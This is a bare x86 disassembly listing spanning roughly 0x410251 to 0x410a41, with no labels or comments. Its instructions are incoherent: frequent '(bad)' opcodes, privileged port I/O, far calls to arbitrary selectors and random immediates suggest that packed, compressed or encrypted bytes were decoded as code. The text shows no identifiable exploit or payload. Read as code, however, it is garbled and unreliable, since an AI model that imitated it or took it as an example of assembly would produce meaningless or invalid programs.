  410251:	sbb    ebp,ebx
  410253:	pop    edi
  410254:	inc    ecx
  410255:	mov    al,0xa3
  410257:	mov    edi,DWORD PTR [ecx+ebp*2]
  41025a:	lock aaa 
  41025c:	mov    ebx,0x6c23d5c1
  410261:	fiadd  DWORD PTR [eax-0x71bdeaac]
  410267:	int3   
  410268:	push   ebp
  410269:	cmp    DWORD PTR [edx+ebp*8+0x7a3c2278],ebx
  410270:	pusha  
  410271:	inc    eax
  410272:	push   edx
  410273:	pop    es
  410274:	push   ebx
  410275:	pushf  
  410276:	ins    BYTE PTR es:[edi],dx
  410277:	mov    al,ds:0x539285c6
  41027c:	fisub  DWORD PTR [eax+0x1fbdddfb]
  410282:	(bad)  
  410283:	push   ebp
  410284:	cld    
  410285:	sub    al,0x85
  410287:	iret   
  410288:	fst    DWORD PTR [ebx+0x30]
  41028b:	adc    edi,DWORD PTR [esi-0x49]
  41028e:	inc    esi
  41028f:	inc    edi
  410290:	mov    edi,0xb2ee3efb
  410295:	in     eax,0x75
  410297:	call   0xeff8:0xf301d250
  41029e:	fimul  WORD PTR [esi]
  4102a0:	and    bl,BYTE PTR [eax+edi*1-0x33]
  4102a4:	sbb    BYTE PTR [ebp+edi*4-0x6032326a],dh
  4102ab:	fcmovbe st,st(6)
  4102ad:	push   es
  4102ae:	dec    edi
  4102af:	cs scas eax,DWORD PTR es:[edi]
  4102b1:	fimul  DWORD PTR [ebp-0x366aa6ac]
  4102b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b8:	jge    0x41028f
  4102ba:	dec    ebp
  4102bb:	inc    edx
  4102bc:	rcr    BYTE PTR [ebx],1
  4102be:	inc    esi
  4102bf:	in     eax,0x50
  4102c1:	add    al,0x3f
  4102c3:	adc    BYTE PTR [esi*4-0x43f0d971],cl
  4102ca:	xchg   esp,eax
  4102cb:	and    BYTE PTR [esi-0x3d],0x70
  4102cf:	call   0x5d5d6703
  4102d4:	xchg   edi,eax
  4102d5:	test   DWORD PTR [edx+0x61],ecx
  4102d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102d9:	das    
  4102da:	gs push esp
  4102dc:	out    dx,al
  4102dd:	push   ds
  4102de:	sbb    eax,0x86dc1d54
  4102e3:	adc    eax,0xe9139627
  4102e8:	add    al,0x6
  4102ea:	jp     0x4102c1
  4102ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102ed:	adc    DWORD PTR [edx+0xf06e150],ebp
  4102f3:	out    dx,eax
  4102f4:	adc    ebx,DWORD PTR [esi]
  4102f6:	sbb    al,0xff
  4102f8:	lods   al,BYTE PTR ds:[esi]
  4102f9:	jnp    0x410340
  4102fb:	call   0xdcbae0ad
  410300:	mov    ds:0x366b4c39,eax
  410305:	cld    
  410306:	loopne 0x4102c7
  410308:	mov    esp,eax
  41030a:	jno    0x410297
  41030c:	xchg   cl,al
  41030e:	add    bh,dh
  410310:	jecxz  0x410380
  410312:	xchg   edi,eax
  410313:	rol    bl,cl
  410315:	sbb    DWORD PTR [ecx+esi*2-0x59],ebp
  410319:	inc    ebx
  41031a:	sbb    al,0x3a
  41031c:	fisub  DWORD PTR [esp+ebx*8]
  41031f:	pop    ebp
  410320:	or     dh,0xc
  410323:	fadd   DWORD PTR [edx-0x601810f]
  410329:	cdq    
  41032a:	or     esi,esi
  41032c:	jo     0x410348
  41032e:	mov    DWORD PTR [ecx+0x7ca7b18a],esi
  410334:	mov    BYTE PTR [eax-0x51],bh
  410337:	das    
  410338:	or     al,0x79
  41033a:	inc    ebx
  41033b:	imul   ebp,DWORD PTR [edx+0x47],0x9b62c616
  410342:	pop    edx
  410343:	imul   eax,DWORD PTR [edx],0x7ea0ba2b
  410349:	push   0xffffffed
  41034b:	(bad)  
  41034d:	xchg   ebx,eax
  41034e:	scas   al,BYTE PTR es:[edi]
  41034f:	aas    
  410350:	and    al,0xa8
  410352:	and    eax,0x25a5378c
  410357:	cmc    
  410358:	or     edi,DWORD PTR [ecx+0x47]
  41035b:	sub    DWORD PTR [ecx-0x2b],esi
  41035e:	push   esi
  41035f:	inc    esi
  410360:	gs jnp 0x4103b6
  410363:	mov    WORD PTR [edx],?
  410365:	pop    ebx
  410366:	into   
  410367:	sub    eax,0xbed209d7
  41036c:	and    al,dl
  41036e:	cmp    DWORD PTR [ebx-0x1730f796],ebp
  410374:	and    al,BYTE PTR [ebx-0x6a]
  410377:	push   esi
  410378:	and    ebp,eax
  41037a:	xchg   BYTE PTR [ebx],al
  41037c:	or     al,0x8a
  41037e:	dec    ebp
  41037f:	les    ebx,FWORD PTR cs:[esi]
  410382:	mov    esp,0xc6c54456
  410387:	mov    ch,0x42
  410389:	jle    0x410382
  41038b:	jb     0x41035f
  41038d:	pop    esi
  41038e:	xchg   ebp,eax
  41038f:	arpl   WORD PTR [ebx+0x6c279686],ax
  410395:	fisub  WORD PTR [ebp+0x60]
  410398:	(bad)
  41039b:	add    bh,bh
  41039d:	dec    eax
  41039e:	mov    edi,0x7274a54e
  4103a3:	add    esi,DWORD PTR [edx-0x215c5e62]
  4103a9:	ret    0x609d
  4103ac:	out    0xa2,eax
  4103ae:	sbb    eax,0x419c337d
  4103b3:	and    eax,0xff7fc88e
  4103b8:	add    dl,BYTE PTR [esi+0x3c]
  4103bb:	inc    ecx
  4103bc:	pushf  
  4103bd:	xchg   edi,eax
  4103be:	mov    ds:0x8148db0d,al
  4103c3:	stos   DWORD PTR es:[edi],eax
  4103c4:	pop    esp
  4103c5:	icebp  
  4103c6:	mov    bh,BYTE PTR [edi+edx*4+0x2e]
  4103ca:	fisttp WORD PTR [esi]
  4103cc:	ins    DWORD PTR es:[edi],dx
  4103cd:	xor    DWORD PTR [ebx-0x61],eax
  4103d0:	xchg   edi,eax
  4103d1:	adc    al,0xe2
  4103d3:	stc    
  4103d4:	xchg   ebp,eax
  4103d5:	mov    BYTE PTR [edx-0x72],bl
  4103d8:	inc    esp
  4103d9:	(bad)  
  4103da:	fidiv  DWORD PTR [ebx]
  4103dc:	jmp    0x1337eb16
  4103e1:	mov    ebp,ecx
  4103e3:	and    eax,DWORD PTR [edi+ecx*1-0x17b365c9]
  4103ea:	cmp    DWORD PTR [ebp-0xd7cacc4],eax
  4103f0:	cwde   
  4103f1:	and    dl,BYTE PTR [eax]
  4103f3:	shr    DWORD PTR [ebx],0xa2
  4103f6:	inc    eax
  4103f7:	jmp    0x8030d431
  4103fc:	test   esi,ecx
  4103fe:	rol    BYTE PTR [esp+ecx*1+0x7e],cl
  410402:	push   0x9f8c7dc5
  410407:	sar    DWORD PTR [ebx-0x6],1
  41040a:	mov    ecx,0x1ed9a57d
  410410:	out    0x43,al
  410412:	and    eax,0x94d513e2
  410417:	shl    BYTE PTR [esi+eiz*8+0x6d65ded3],0x14
  41041f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410420:	add    cl,BYTE PTR [ecx+0x49]
  410423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410424:	out    dx,al
  410425:	stos   DWORD PTR es:[edi],eax
  410426:	dec    DWORD PTR [ecx+ecx*1]
  410429:	ret    0x2181
  41042c:	add    ebp,DWORD PTR [esi+0x659c736a]
  410432:	cmp    al,0x69
  410434:	fdivr  DWORD PTR [ebp+0x7c8d0afa]
  41043a:	loop   0x4103c9
  41043c:	mov    ebx,0x10c4d830
  410441:	call   0xda8609d9
  410446:	pop    esp
  410447:	inc    edx
  410448:	dec    edi
  410449:	mov    DWORD PTR [eax-0x4e],ebx
  41044c:	cli    
  41044d:	daa    
  41044e:	mov    al,ds:0xefdfecfe
  410453:	dec    eax
  410454:	add    eax,0xdebc21b0
  410459:	int    0x6
  41045b:	pop    ecx
  41045c:	mov    ecx,0xa52ed0c0
  410461:	ret    
  410462:	add    BYTE PTR ds:0x230cc6c,bh
  410468:	les    eax,FWORD PTR [ebp-0x36]
  41046b:	xchg   ecx,eax
  41046c:	xlat   BYTE PTR ds:[ebx]
  41046d:	test   ecx,0x761513ea
  410473:	(bad)  
  410475:	shl    DWORD PTR [ebx],1
  410477:	repz xchg edx,edx
  41047a:	nop
  41047b:	retf   
  41047c:	push   0xd52d004c
  410481:	mov    WORD PTR [edx-0x3258313b],cs
  410487:	push   edi
  410488:	(bad)  
  410489:	xor    bh,BYTE PTR ds:0x9740ec6b
  41048f:	xchg   BYTE PTR [edi+0x58],dl
  410492:	lea    ecx,[edi+0x45e20f5]
  410498:	cmp    al,0xb4
  41049a:	(bad)  
  41049b:	fld    DWORD PTR [eax+ecx*1]
  41049e:	and    cl,BYTE PTR [ebp+0x3ccb4c7f]
  4104a4:	aad    0xd0
  4104a6:	cmp    dl,BYTE PTR [eax-0x5bbd6b2]
  4104ac:	jb     0x410515
  4104ae:	mov    ebp,0x9cb4092
  4104b3:	mov    WORD PTR [eax],fs
  4104b5:	loope  0x4104c5
  4104b7:	int3   
  4104b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b9:	cmp    al,0x39
  4104bb:	int3   
  4104bc:	cmp    al,dl
  4104be:	adc    edi,DWORD PTR [edx-0x1a]
  4104c1:	ins    DWORD PTR es:[edi],dx
  4104c2:	mov    dl,0xc7
  4104c4:	jns    0x41048a
  4104c6:	jmp    0x3276:0x8cc5e715
  4104cd:	sub    DWORD PTR [edx+0x76a71838],esi
  4104d3:	xchg   edi,eax
  4104d4:	in     al,dx
  4104d5:	adc    DWORD PTR [edx],esi
  4104d7:	rdtsc  
  4104d9:	jo     0x410502
  4104db:	inc    esi
  4104dc:	push   cs
  4104dd:	sub    esp,DWORD PTR [edi]
  4104df:	(bad)  
  4104e0:	adc    BYTE PTR ds:0x5ee0fe93,ch
  4104e6:	iret   
  4104e7:	mov    ecx,0xa3998156
  4104ec:	ror    cl,cl
  4104ee:	int    0xbe
  4104f0:	add    al,0x7
  4104f2:	bound  edx,QWORD PTR [edx+eax*1-0x3650bd85]
  4104f9:	shl    BYTE PTR [edx-0x3e],cl
  4104fc:	dec    ebx
  4104fd:	sub    BYTE PTR [eax],0x88
  410500:	aaa    
  410501:	jns    0x41048a
  410503:	out    0x1e,al
  410505:	mov    WORD PTR [esi],ds
  410507:	jp     0x410506
  410509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41050a:	dec    ebx
  41050b:	out    dx,eax
  41050c:	sbb    DWORD PTR ds:0x85b61f38,esi
  410512:	xchg   edx,eax
  410513:	std    
  410514:	lahf   
  410515:	xchg   esp,eax
  410516:	jle    0x410586
  410518:	cmp    dl,ah
  41051a:	mov    eax,ds:0x90fb7e63
  41051f:	mov    esp,0x40ac41a9
  410524:	lds    ecx,FWORD PTR [ebx]
  410526:	inc    ebx
  410527:	fist   DWORD PTR [ecx]
  410529:	mov    bh,0xcf
  41052b:	mov    edx,0x6386f09b
  410530:	or     eax,0xc7f9f526
  410535:	adc    ebp,DWORD PTR [ecx]
  410537:	jp     0x41058f
  410539:	mov    al,0xb0
  41053b:	jne    0x410596
  41053d:	adc    BYTE PTR [edi-0x78cd4da],bh
  410543:	xor    eax,0x1b8f37c0
  410548:	or     eax,0xd157a57d
  41054d:	dec    ebp
  41054e:	xor    DWORD PTR [eax],ebp
  410550:	das    
  410551:	mov    eax,0xcb450020
  410556:	adc    al,ch
  410558:	popf   
  410559:	jge    0x410557
  41055b:	add    bl,BYTE PTR [edx+0x4c]
  41055e:	jecxz  0x410501
  410560:	stos   BYTE PTR es:[edi],al
  410561:	loopne 0x4105b9
  410563:	mov    esp,0x83f3eadf
  410568:	ins    DWORD PTR es:[edi],dx
  410569:	sub    eax,0xd79ea4ae
  41056e:	push   edx
  41056f:	add    DWORD PTR [ecx],0xffffffb4
  410572:	pushf  
  410573:	(bad)  
  410574:	xchg   ebx,eax
  410575:	retf   
  410576:	pop    ecx
  410577:	or     BYTE PTR [ebx+ebx*8+0x41],cl
  41057b:	push   0x33
  41057d:	jmp    0x851cc91a
  410582:	and    DWORD PTR [ebx],esp
  410584:	fsub   st(1),st
  410586:	stos   DWORD PTR es:[edi],eax
  410587:	fsubr  DWORD PTR [esi+0x52]
  41058a:	stos   DWORD PTR es:[edi],eax
  41058b:	int    0xa4
  41058d:	cwde   
  41058e:	stos   BYTE PTR es:[edi],al
  41058f:	(bad)  
  410590:	in     al,dx
  410591:	inc    esp
  410592:	mov    eax,0x7231db02
  410597:	add    DWORD PTR [ebp-0x5d],edx
  41059a:	jl     0x41052f
  41059c:	(bad)  
  41059d:	hlt    
  41059e:	rol    DWORD PTR [edx+eiz*1-0x22dadf36],0xc0
  4105a6:	push   ss
  4105a7:	pop    ss
  4105a8:	mov    ch,BYTE PTR [edx+0x30e6b9d4]
  4105ae:	push   cs
  4105af:	ja     0x410555
  4105b1:	sub    al,0x3d
  4105b3:	(bad)  
  4105b4:	mov    bl,0xee
  4105b6:	mov    eax,0xb5504c3b
  4105bb:	std    
  4105bc:	imul   ebx,DWORD PTR [eax+0x2168a8fd],0xfffffffb
  4105c3:	sbb    BYTE PTR [ebx-0x51],dh
  4105c6:	jp     0x4105de
  4105c8:	(bad)  
  4105c9:	xor    BYTE PTR [edx+0x451f40b7],ah
  4105cf:	(bad)  
  4105d0:	int3   
  4105d1:	or     ch,BYTE PTR [esi+ebp*2-0x1e70f9a0]
  4105d8:	in     eax,dx
  4105d9:	jo     0x410652
  4105db:	xchg   edi,eax
  4105dc:	dec    esi
  4105dd:	sbb    eax,0x532a2b19
  4105e2:	pop    edi
  4105e3:	imul   DWORD PTR [edi]
  4105e5:	adc    eax,0xf753ce4d
  4105ea:	outs   dx,BYTE PTR ds:[esi]
  4105eb:	adc    al,0xcc
  4105ed:	cmp    DWORD PTR [ebp-0x3e7d09ca],edx
  4105f3:	xor    edi,DWORD PTR [eax-0x3adb2fc]
  4105f9:	push   esi
  4105fa:	push   ds
  4105fb:	in     eax,dx
  4105fc:	inc    ebp
  4105fd:	pop    ecx
  4105fe:	dec    esi
  4105ff:	fcmovu st,st(7)
  410601:	mov    edx,0x63c77770
  410606:	shl    DWORD PTR [ebx+0x49],1
  410609:	or     esi,esp
  41060b:	sqrtps xmm7,XMMWORD PTR [ecx+0x70e3ab77]
  410612:	jl     0x410619
  410614:	sub    al,0x48
  410616:	mov    ds:0x489c17f0,al
  41061b:	fadd   QWORD PTR [esp+ecx*2]
  41061e:	pusha  
  41061f:	je     0x4105d8
  410621:	pop    eax
  410622:	adc    ebp,ebx
  410624:	rcr    DWORD PTR [ebx],1
  410626:	cwde   
  410627:	inc    edi
  410628:	xor    bl,dh
  41062a:	dec    edx
  41062b:	(bad)  
  41062c:	fisttp WORD PTR [eax-0x601e7601]
  410632:	repnz rol eax,0xed
  410636:	or     eax,0xc08c5cef
  41063b:	mov    al,0x20
  41063d:	ror    BYTE PTR [ecx],0x84
  410640:	adc    BYTE PTR [ebx+ebx*2-0x4f7cab04],dh
  410647:	sub    DWORD PTR [ecx-0x33c1f345],0x2d
  41064e:	lahf   
  41064f:	mov    dl,0x57
  410651:	and    BYTE PTR [esi+0x1a],dl
  410654:	ins    BYTE PTR es:[edi],dx
  410655:	ja     0x41069b
  410657:	fimul  WORD PTR [edi+0x4ef77552]
  41065d:	test   eax,0x56c02c9d
  410662:	cwde   
  410663:	xchg   DWORD PTR [ebp-0x35],ebp
  410666:	pop    ebx
  410667:	daa    
  410668:	nop
  410669:	cld    
  41066a:	xor    eax,DWORD PTR [edx+0x75]
  41066d:	test   BYTE PTR [edx-0x53],bh
  410670:	add    al,0x8c
  410672:	cmp    al,0xc9
  410674:	ror    BYTE PTR [eax+0x49708c55],0x4d
  41067b:	fwait
  41067c:	adc    BYTE PTR [esp+esi*4+0x25],bh
  410680:	lea    ecx,[edx+0x74]
  410683:	div    DWORD PTR [ebp+0x54]
  410686:	xlat   BYTE PTR ds:[ebx]
  410687:	rcl    DWORD PTR [edx],0xd4
  41068a:	pushf  
  41068b:	mov    ebp,0x12e8a039
  410690:	cwde   
  410691:	pop    ebx
  410692:	pushf  
  410693:	sbb    DWORD PTR [esi+0x186b5b69],0x26
  41069a:	call   0xc899:0x6a62a73b
  4106a1:	clc    
  4106a2:	popa   
  4106a3:	out    0xfd,eax
  4106a5:	es pop ss
  4106a7:	sub    DWORD PTR [edx],0xffffff94
  4106aa:	lods   eax,DWORD PTR ds:[esi]
  4106ab:	xchg   ebp,eax
  4106ac:	ins    DWORD PTR es:[di],dx
  4106ae:	xchg   ecx,eax
  4106af:	repz mov ch,0x9b
  4106b2:	imul   edi,DWORD PTR [ecx-0x102def94],0x316bd154
  4106bc:	and    dl,dl
  4106be:	xor    ah,dl
  4106c0:	jg     0x410738
  4106c2:	mov    dh,0x80
  4106c4:	popf   
  4106c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106c6:	or     al,0x8e
  4106c8:	call   0x8d85ff46
  4106cd:	dec    ecx
  4106ce:	bound  ebp,QWORD PTR [edx+edi*8+0x263f0420]
  4106d5:	lahf   
  4106d6:	pop    eax
  4106d7:	mov    eax,ds:0xe5f3bc6f
  4106dc:	repz jmp 0x9cef:0x7e4f9ed2
  4106e4:	push   ds
  4106e5:	sbb    al,0x72
  4106e7:	cmp    DWORD PTR [edx],eax
  4106e9:	mov    al,ds:0xac1ae676
  4106ee:	sbb    DWORD PTR [esi+0x27e5f128],edi
  4106f4:	fcmovnb st,st(6)
  4106f6:	test   BYTE PTR [ecx-0x652a879],dl
  4106fc:	jnp    0x4106c3
  4106fe:	mov    ds:0x5a4059d3,al
  410703:	or     dl,BYTE PTR [edx+0x60]
  410706:	jl     0x4106fb
  410708:	xor    ch,BYTE PTR [ebx-0x7dfaa91e]
  41070e:	adc    DWORD PTR [eax],eax
  410710:	dec    edi
  410711:	fmul   DWORD PTR [eax+0x0]
  410714:	repz and BYTE PTR [ebp+0x309ff470],dh
  41071b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41071c:	sub    DWORD PTR [edi],edx
  41071e:	add    BYTE PTR [esi+0x5088d817],0x61
  410725:	popa   
  410726:	pop    edi
  410727:	dec    BYTE PTR [ebx+0x2d16def0]
  41072d:	outs   dx,BYTE PTR ds:[esi]
  41072e:	out    0x95,al
  410730:	or     DWORD PTR [esi],esp
  410732:	(bad)  
  410733:	mov    esi,0xe5163c53
  410738:	in     eax,0x14
  41073a:	jns    0x4107b9
  41073c:	pop    edx
  41073d:	aam    0x75
  41073f:	scas   al,BYTE PTR es:[edi]
  410740:	sbb    ch,BYTE PTR [edi+0x432a2f8c]
  410746:	out    0xb9,al
  410748:	jp     0x4107b2
  41074a:	pop    ebx
  41074b:	push   edi
  41074c:	ret    0x5d0d
  41074f:	and    DWORD PTR [ecx],edx
  410751:	inc    ebx
  410752:	mov    al,0xe6
  410754:	push   0xe7f6e4cb
  410759:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41075b:	in     eax,0xfb
  41075d:	cmp    DWORD PTR [esi-0x53],esp
  410760:	hlt    
  410761:	iret   
  410762:	xchg   ebp,eax
  410763:	sub    BYTE PTR [eax-0x1be5ad50],dl
  410769:	add    dh,bl
  41076b:	push   edx
  41076c:	in     eax,0xf8
  41076e:	xor    DWORD PTR [bp+si-0x67],edi
  410772:	loop   0x4107b7
  410774:	in     eax,0x1
  410776:	xchg   esi,eax
  410777:	sub    BYTE PTR [ebx+0x1d],bh
  41077a:	les    esi,FWORD PTR [edi]
  41077c:	jnp    0x410793
  41077e:	int    0xfd
  410780:	in     al,dx
  410781:	pop    esi
  410782:	inc    edx
  410783:	mov    ds:0xb51529d9,al
  410788:	fst    QWORD PTR [edx+eiz*2+0x1]
  41078c:	and    ch,BYTE PTR cs:[esi+0x699b9f3f]
  410793:	lock add DWORD PTR [esi+0x4b5928b0],ebx
  41079a:	push   edi
  41079b:	mov    DWORD PTR [ebx-0x6f],edi
  41079e:	call   0xcb07c840
  4107a3:	(bad)  
  4107a5:	cdq    
  4107a6:	rcl    BYTE PTR [ebx-0x6e],1
  4107a9:	nop
  4107aa:	and    dl,al
  4107ac:	jl     0x4107d1
  4107ae:	add    BYTE PTR [ecx+ebx*4],0xef
  4107b2:	fistp  WORD PTR [edi-0x59]
  4107b5:	ja     0x41080e
  4107b7:	adc    BYTE PTR [ebp+0x33],ch
  4107ba:	sbb    al,0xd0
  4107bc:	mov    dh,BYTE PTR [esi]
  4107be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107bf:	xor    eax,0x4fb80c92
  4107c4:	out    dx,al
  4107c5:	cmp    al,0xc2
  4107c7:	addr16 loope 0x410803
  4107ca:	fidiv  WORD PTR [esi]
  4107cc:	daa    
  4107cd:	ins    DWORD PTR es:[edi],dx
  4107ce:	mov    esi,0x2201cef5
  4107d3:	in     eax,0x95
  4107d5:	sbb    ebx,0x3b
  4107d8:	mov    edx,0xfa31b5c7
  4107dd:	lock mov edi,0x760111ba
  4107e3:	jo     0x4107bc
  4107e5:	adc    al,0x7f
  4107e7:	fldcw  WORD PTR [edx+0x1a]
  4107ea:	in     eax,0x54
  4107ec:	xor    BYTE PTR [eax-0x283acefa],dl
  4107f2:	jle    0x41078b
  4107f4:	gs mov ebx,0x622ade69
  4107fa:	add    eax,0xd0fe272b
  4107ff:	stos   DWORD PTR es:[edi],eax
  410800:	sbb    dl,BYTE PTR [esi]
  410802:	xchg   DWORD PTR [ebx],edx
  410804:	or     WORD PTR [edx-0x35],si
  410808:	pop    edi
  410809:	xlat   BYTE PTR ds:[ebx]
  41080a:	popf   
  41080b:	and    eax,0xaf9eeed3
  410810:	aaa    
  410811:	pop    es
  410812:	xchg   esi,eax
  410813:	xchg   ebx,eax
  410814:	pop    ebp
  410815:	push   esi
  410816:	adc    eax,0xae32bdcf
  41081b:	pop    ebp
  41081c:	popf   
  41081d:	mov    eax,fs
  41081f:	mov    es,WORD PTR [ecx-0x14]
  410822:	lods   eax,DWORD PTR ds:[esi]
  410823:	iret   
  410824:	dec    esi
  410825:	xor    bl,BYTE PTR [edi]
  410827:	add    eax,0xa551ab1e
  41082c:	nop
  41082d:	sub    esp,DWORD PTR [ecx+0x6809a589]
  410833:	hlt    
  410834:	lahf   
  410835:	in     eax,dx
  410836:	sub    DWORD PTR [ebx-0x59],ecx
  410839:	mov    ds,WORD PTR [esp+ecx*8-0xa]
  41083d:	iret   
  41083e:	push   eax
  41083f:	or     DWORD PTR [ebx+0xc654cca],ebp
  410845:	(bad)  [ebp-0xb60734c]
  41084b:	clc    
  41084c:	sub    DWORD PTR [ebp+0x25efe88f],esp
  410852:	dec    ecx
  410853:	lea    ebx,[ebx]
  410855:	mov    edx,0xc0063bee
  41085a:	loopne 0x41082b
  41085c:	shl    bl,cl
  41085e:	jp     0x41087c
  410860:	mul    BYTE PTR [ecx]
  410862:	push   esp
  410863:	sbb    dh,BYTE PTR ds:0x1334e68d
  410869:	ins    DWORD PTR es:[edi],dx
  41086a:	rcl    BYTE PTR [ebx-0x7b],cl
  41086d:	jb     0x41089c
  41086f:	stos   BYTE PTR es:[edi],al
  410870:	cmp    al,0x61
  410872:	mov    BYTE PTR [ebx+0x77dc4472],0x13
  410879:	fxtract 
  41087b:	sar    al,0xcc
  41087e:	fcomp  QWORD PTR [edi+0x79]
  410881:	and    edi,DWORD PTR [esi+0x4cadfc0b]
  410887:	sbb    eax,0x83b42336
  41088c:	cmp    esi,ebp
  41088e:	js     0x41086b
  410890:	test   DWORD PTR [ecx+0x3de0cfab],edi
  410896:	inc    ebp
  410897:	lock out dx,al
  410899:	scas   eax,DWORD PTR es:[edi]
  41089a:	dec    ecx
  41089b:	imul   esp,DWORD PTR [eax+0x78],0x56
  41089f:	xchg   edx,eax
  4108a0:	and    ch,BYTE PTR [eax-0x53973521]
  4108a6:	(bad)  
  4108a7:	dec    ecx
  4108a8:	adc    dl,BYTE PTR [esi+0x63673bd7]
  4108ae:	adc    ebp,DWORD PTR [esi+0x7b]
  4108b1:	out    dx,eax
  4108b2:	mov    cl,0xa5
  4108b4:	js     0x410847
  4108b6:	add    DWORD PTR [esi-0xf],0xebc09490
  4108bd:	push   ss
  4108be:	sub    eax,0x1379d842
  4108c3:	loope  0x410885
  4108c5:	int3   
  4108c6:	dec    edi
  4108c7:	jmp    ecx
  4108c9:	retf   0x3d75
  4108cc:	(bad)  [edi+esi*8-0x49]
  4108d0:	(bad)
  4108d3:	fsubr  QWORD PTR [ebx-0x10f16568]
  4108d9:	int3   
  4108da:	ret    
  4108db:	mov    ds:0x64c29f35,al
  4108e0:	lds    esi,FWORD PTR cs:[edi+0x74]
  4108e4:	ins    BYTE PTR es:[edi],dx
  4108e5:	push   edx
  4108e6:	mov    ch,0x62
  4108e8:	nop
  4108e9:	mov    edx,0x664500e0
  4108ee:	daa    
  4108ef:	mov    esp,0xfec372af
  4108f4:	shl    DWORD PTR [edi+0x25],0x4
  4108f8:	xor    bh,al
  4108fa:	xor    edi,esi
  4108fc:	and    al,0x1a
  4108fe:	fwait
  4108ff:	ins    DWORD PTR es:[edi],dx
  410900:	xor    ch,BYTE PTR [ecx+0x6925cefa]
  410906:	hlt    
  410907:	and    bl,al
  410909:	ins    BYTE PTR es:[edi],dx
  41090a:	xor    cl,0x75
  41090d:	out    0x2b,al
  41090f:	mov    dl,0x14
  410911:	mov    ch,0x8e
  410913:	push   0xe44e2e45
  410918:	pusha  
  410919:	aas    
  41091a:	lock jo 0x410984
  41091d:	inc    esp
  41091e:	and    ah,BYTE PTR [eax+0x59d7d377]
  410924:	int3   
  410925:	xor    DWORD PTR [ebx+ebp*1+0x1e433a13],0xffffffe7
  41092d:	repz inc esp
  41092f:	and    eax,0x7f
  410932:	loope  0x410946
  410934:	or     bl,0xea
  410937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410938:	pop    ds
  410939:	jbe    0x410991
  41093b:	fadd   QWORD PTR [esi+0x48]
  41093e:	or     DWORD PTR [esi+0x17],eax
  410941:	imul   DWORD PTR [edi]
  410943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410944:	mov    dl,0x3c
  410946:	(bad)  
  410947:	fcom   QWORD PTR [eax]
  410949:	(bad)  
  41094a:	pop    edi
  41094b:	adc    ah,BYTE PTR [edx+eiz*4-0x1f]
  41094f:	idiv   ebx
  410951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410952:	imul   ebx,ecx,0xf58ca142
  410958:	popa   
  410959:	aas    
  41095a:	mov    eax,0xa12cfbe7
  41095f:	mov    edx,0x7e3e42e6
  410964:	xchg   edi,eax
  410965:	jb     0x4109d7
  410967:	xor    BYTE PTR [eax+0x2b],cl
  41096a:	sub    eax,0x26ede9d3
  41096f:	push   esp
  410970:	cli    
  410971:	dec    eax
  410972:	(bad)  
  410973:	in     eax,dx
  410974:	adc    al,0x5c
  410976:	and    al,0x53
  410978:	sbb    ah,ch
  41097a:	xor    edx,DWORD PTR [edx]
  41097c:	dec    esi
  41097d:	(bad)  
  41097e:	rcl    DWORD PTR [edi+eiz*4],cl
  410981:	gs enter 0x3229,0xf1
  410986:	push   es
  410987:	aaa    
  410988:	test   edx,eax
  41098a:	out    dx,eax
  41098b:	ret    
  41098c:	or     ch,BYTE PTR [ecx]
  41098e:	das    
  41098f:	ret    
  410990:	xor    al,0xd3
  410992:	push   ds
  410993:	cmc    
  410994:	das    
  410995:	or     BYTE PTR [edi],bl
  410997:	mov    ds:0x7594bd28,eax
  41099c:	outs   dx,DWORD PTR ds:[esi]
  41099d:	daa    
  41099e:	sub    DWORD PTR [ebx],esi
  4109a0:	jmp    0x2079:0x5c8bf79e
  4109a7:	jnp    0x4109c6
  4109a9:	inc    esp
  4109aa:	push   esp
  4109ab:	mov    ch,0xa4
  4109ad:	xor    ah,cl
  4109af:	(bad)  
  4109b0:	jne    0x410966
  4109b2:	and    ebp,ebx
  4109b4:	sbb    DWORD PTR [edx],ebp
  4109b6:	shl    DWORD PTR ds:[eax-0x7af9326e],1
  4109bd:	mov    ds:0xcfa402f7,eax
  4109c2:	adc    ebx,DWORD PTR [eax+0x36e7b007]
  4109c8:	pop    es
  4109c9:	xor    eax,0x3324e02
  4109ce:	add    ch,bh
  4109d0:	and    al,BYTE PTR [eax+0x65]
  4109d3:	adc    dl,BYTE PTR [esi+0x5e]
  4109d6:	arpl   WORD PTR [ebp-0x1f19e03d],bp
  4109dc:	je     0x410975
  4109de:	sub    ebx,esi
  4109e0:	shl    BYTE PTR [edi+0x9ab5397],0xc9
  4109e7:	dec    edi
  4109e8:	adc    edi,DWORD PTR [ebp+0x3043e930]
  4109ee:	adc    DWORD PTR [ecx],ebp
  4109f0:	add    al,0x4
  4109f2:	(bad)  
  4109f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109f4:	jmp    0xabc4f64
  4109f9:	mov    ebp,0x1094fb45
  4109fe:	mov    ds:0x988cfdb4,al
  410a03:	sub    BYTE PTR [edi+0x461941fb],al
  410a09:	mov    bh,0xc4
  410a0b:	sbb    DWORD PTR [eax+0x5ee91539],eax
  410a11:	sti    
  410a12:	cmp    BYTE PTR ds:0x584d1494,cl
  410a18:	xchg   BYTE PTR [edx+0x5f50ecdc],dh
  410a1e:	in     al,dx
  410a1f:	mov    bh,0x5c
  410a21:	enter  0xc8b5,0xc6
  410a25:	and    eax,0x7a7309bb
  410a2a:	xchg   esi,eax
  410a2b:	mov    ch,0xe
  410a2d:	cmp    eax,0x142a1bef
  410a32:	push   cs
  410a33:	add    BYTE PTR [ecx],al
  410a35:	in     al,dx
  410a36:	(bad)  
  410a37:	ret    0x5454
  410a3a:	mov    DWORD PTR [ecx+0x7c],edi
  410a3d:	das    
  410a3e:	leave  
  410a3f:	jge    0x410a30
  410a41:	pop    ss
